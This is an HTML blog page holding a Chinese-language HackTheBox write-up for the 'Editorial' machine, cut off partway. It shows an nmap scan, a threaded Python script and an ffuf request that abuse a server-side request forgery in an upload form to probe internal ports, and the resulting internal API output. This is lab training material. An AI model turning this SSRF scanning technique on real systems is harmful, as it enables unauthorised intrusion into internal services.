@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P EditorialNmap12345678910111213PORT   STATE SERVICE REASON         VERSION22&#x2F;tcp open">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Editorial">
+<meta property="og:url" content="https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P EditorialNmap12345678910111213PORT   STATE SERVICE REASON         VERSION22&#x2F;tcp open">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616162901-1kzysks.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616163016-6hzh2en.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616164045-9hd2g46.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616164459-642r8i2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616164714-3v5wthj.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616170148-saqdkez.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616170547-a7hr4wn.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616170612-5ho4rec.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616170747-5v17gtb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616170821-dburna0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616171021-eqhnm8b.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616171248-au81j5h.png">
+<meta property="article:published_time" content="2024-06-16T10:35:00.000Z">
+<meta property="article:modified_time" content="2024-10-23T03:50:17.803Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616162901-1kzysks.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Editorial</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/06/17/2024/0617-htb-Rastalabs/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/06/13/2024/0613-htb-dante/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&text=HackTheBox - Machine - Editorial"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&title=HackTheBox - Machine - Editorial"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&is_video=false&description=HackTheBox - Machine - Editorial"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Editorial&body=Check out this article: https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&title=HackTheBox - Machine - Editorial"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&title=HackTheBox - Machine - Editorial"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&title=HackTheBox - Machine - Editorial"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&title=HackTheBox - Machine - Editorial"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&name=HackTheBox - Machine - Editorial&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/06/16/2024-htb-machine/24-Editorial/&t=HackTheBox - Machine - Editorial"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Editorial
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-06-16T10:35:00.000Z" class="dt-published" itemprop="datePublished">2024-06-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Editorial"><a href="#Editorial" class="headerlink" title="Editorial"></a>Editorial</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh     syn-ack ttl <span class="number">63</span> OpenSSH <span class="number">8.9</span>p1 Ubuntu 3ubuntu0<span class="number">.7</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">256</span> 0d:ed:b2:9c:e2:<span class="number">53</span>:fb:d4:c8:c1:<span class="number">19</span>:6e:<span class="number">75</span>:<span class="number">80</span>:d8:<span class="number">64</span> (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=</span><br><span class="line">|   <span class="number">256</span> 0f:b9:a7:<span class="number">51</span>:0e:<span class="number">00</span>:d5:7b:5b:7c:5f:bf:2b:ed:<span class="number">53</span>:a0 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  http    syn-ack ttl <span class="number">63</span> nginx <span class="number">1.18</span><span class="number">.0</span> (Ubuntu)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx/<span class="number">1.18</span><span class="number">.0</span> (Ubuntu)</span><br><span class="line">|_http-title: Did <span class="keyword">not</span> follow redirect to http://editorial.htb</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>可以看到兩個端口，肯定是從80端口進去的。</p>
+<h2 id="80-web"><a href="#80-web" class="headerlink" title="80 - web"></a>80 - web</h2><p>掃了一下子域名，什麽也沒有</p>
+<p>‍</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616162901-1kzysks.png" alt="image">​</p>
+<p>不過這裏有一個輸入遠程的鏈接，然後本地開一個python的服務器，用nc探測下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvnp <span class="number">80</span></span><br><span class="line">Listening on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">80</span></span><br><span class="line">Connection received on <span class="number">10.129</span><span class="number">.116</span><span class="number">.73</span> <span class="number">42534</span></span><br><span class="line">GET /testing HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">10.10</span><span class="number">.16</span><span class="number">.23</span></span><br><span class="line">User-Agent: python-requests/<span class="number">2.25</span><span class="number">.1</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+
+<p>看到是 <code>python-requests/2.25.1</code>​ ，網上查了一下，沒有什麽比較嚴重的CVE。</p>
+<p>然後我嘗試用burp截取，如果我嘗試訪問本地的80端口會怎樣：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616163016-6hzh2en.png" alt="image">​</p>
+<p>結果卡住了。。那其他端口呢？</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">11</span>  -&gt;  /static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">11</span>  -&gt;  /static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg</span><br><span class="line">http://<span class="number">10.10</span><span class="number">.16</span><span class="number">.23</span>   -&gt;  /static/uploads/7dc9ddc8-777d-<span class="number">4450</span>-bdfb-b84066a77e7f</span><br></pre></td></tr></table></figure>
+
+<p>可以看到儅失敗的時候，總是返回 <code>unsplash_photo_1630734277837_ebe62757b6e0</code>​，但是成功會給我們另一個url。</p>
+<p>如果本地開啓了其他的http服務器，那麽就可以通過這種方法獲取一些有價值的東西，所以隨手寫一個脚本去探測：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, FIRST_COMPLETED</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">thr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        burp0_url = <span class="string">&quot;http://editorial.htb:80/upload-cover&quot;</span></span><br><span class="line">        burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en-US,en;q=0.5&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=---------------------------216537431637657149343063426523&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://editorial.htb&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://editorial.htb/upload&quot;</span>&#125;</span><br><span class="line">        burp0_data = <span class="string">&quot;-----------------------------216537431637657149343063426523\r\nContent-Disposition: form-data; name=\&quot;bookurl\&quot;\r\n\r\nhttp://127.0.0.1:&quot;</span>+<span class="built_in">str</span>(x)+<span class="string">&quot;\r\n-----------------------------216537431637657149343063426523\r\nContent-Disposition: form-data; name=\&quot;bookfile\&quot;; filename=\&quot;\&quot;\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------216537431637657149343063426523--\r\n&quot;</span></span><br><span class="line">        ret_str =  requests.post(burp0_url, headers=burp0_headers, data=burp0_data,timeout=<span class="number">3</span>).text</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg&quot;</span> <span class="keyword">in</span> ret_str):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Found %s &quot;</span> % (x))</span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Found %s &quot;</span> % (x))</span><br><span class="line"></span><br><span class="line">executor = ThreadPoolExecutor(max_workers=<span class="number">60</span>)</span><br><span class="line">all_task  = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65536</span>):</span><br><span class="line">    all_task.append(executor.submit(thr, i))</span><br><span class="line"></span><br><span class="line">wait(all_task, return_when=ALL_COMPLETED)</span><br></pre></td></tr></table></figure>
+
+<p>只要服務器返回的結果沒有 <code>/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg</code>​ 這一串東西，都算成功，運行如下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616164045-9hd2g46.png" alt="image">​</p>
+<p>你可以看到開放了 80 和 5000 端口，不過想了一下，ffuf 應該是也可以，只是80端口因爲超時所以不會顯示在ffuf的結果上：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /upload-cover HTTP/<span class="number">1.1</span></span><br><span class="line">Host: editorial.htb</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (X11; Linux x86_64; rv:<span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">115.0</span></span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=<span class="number">0.5</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=---------------------------<span class="number">27500373877983671053194122670</span></span><br><span class="line">Content-Length: <span class="number">361</span></span><br><span class="line">Origin: http://editorial.htb</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://editorial.htb/upload</span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">27500373877983671053194122670</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;bookurl&quot;</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:FUZZ</span><br><span class="line">-----------------------------<span class="number">27500373877983671053194122670</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;bookfile&quot;</span>; filename=<span class="string">&quot;&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">27500373877983671053194122670</span>--</span><br></pre></td></tr></table></figure>
+
+<p>類似如下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616164459-642r8i2.png" alt="image">​</p>
+<p>知道開放了5000的端口，這樣就可以嘗試發送一個請求，看看有什麽結果：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-7P8zqm30InsFzkOU-Editorial/image-20240616164714-3v5wthj.png" alt="image">​</p>
+<p>可以看到返回了一大串json，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://editorial.htb/static/uploads/ad7a5814-<span class="number">9163</span>-4ced-<span class="number">8838</span>-ac19cd53b8e9</span><br><span class="line">&#123;<span class="string">&quot;messages&quot;</span>:[&#123;<span class="string">&quot;promotions&quot;</span>:&#123;<span class="string">&quot;description&quot;</span>:<span class="string">&quot;Retrieve a list of all the promotions in our library.&quot;</span>,<span class="string">&quot;endpoint&quot;</span>:<span class="string">&quot;/api/latest/metadata/messages/promos&quot;</span>,<span class="string">&quot;methods&quot;</span>:<span class="string">&quot;GET&quot;</span>&#125;&#125;,&#123;<span class="string">&quot;coupons&quot;</span>:&#123;<span class="string">&quot;description&quot;</span>:<span class="string">&quot;Retrieve the list of coupons to use in our library.&quot;</span>,<span class="string">&quot;endpoint&quot;</span>:<span class="string">&quot;/api/latest/metadata/messages/coupons&quot;</span>,<span class="string">&quot;methods&quot;</span>:<span class="string">&quot;GET&quot;</span>&#125;&#125;,&#123;<span class="string">&quot;new_authors&quot;</span>:&#123;<span class="string">&quot;description&quot;</span>:<span class="string">&quot;Retrieve the welcome message sended to our new authors.&quot;</span>,<span class="string">&quot;endpoint&quot;</span>:<span class="string">&quot;/api/latest/metadata/messages/authors&quot;</span>,<span class="string">&quot;methods&quot;</span>:<span class="string">&quot;GET&quot;</span>&#125;&#125;,&#123;<span class="string">&quot;platform_use&quot;</span>:&#123;<span class="string">&quot;description&quot;</span>:<span class="string">&quot;Retrieve examples of how to use the platform.&quot;</span>,<span class="string">&quot;endpoint&quot;</span>:<span class="string">&quot;/api/latest/metadata/messages/how_to_use_platform&quot;</span>,<span class="string">&quot;methods&quot;</span>:<span class="string">&quot;GET&quot;</span>&#125;&#125;],<span class="string">&quot;version&quot;</span>:[&#123;<span class="string">&quot;changelog&quot;</span>:&#123;<span class="string">&quot;description&quot;</span>:<span class="string">&quot;Retrieve a list of all the versions and updates of the api.&quot;</span>,<span class="string">&quot;endpoint&quot;</span>:<span class="string">&quot;/api/latest/metadata/changelog&quot;</span>,<span class="string">&quot;methods&quot;</span>:<span class="string">&quot;GET&quot;</span>&#125;&#125;,&#123;<span class="string">&quot;latest&quot;</span>:&#123;<span class="string">&quot;description&quot;</span>:<span class="string">&quot;Retrieve the last version of api.&quot;</span>,<span class="string">&quot;endpoint&quot;</span>:<span class="string">&quot;/api/latest/metadata&quot;</span>,<span class="string">&quot;methods&quot;</span>:<span class="string">&quot;GET&quot;</span>&#125;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">$ curl http://editorial.htb/static/uploads/ad7a5814-<span class="number">9163</span>-4ced-<span class="number">8838</span>-ac19cd53b8e9 | jq</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line"><span class="number">100</span>   <span class="number">911</span>  <span class="number">100</span>   <span class="number">911</span>    <span class="number">0</span>     <span class="number">0</span>   <span class="number">6241</span>      <span class="number">0</span> --:--:-- --:--:-- --:--:--  <span class="number">6282</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;messages&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;promotions&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Retrieve a list of all the promotions in our 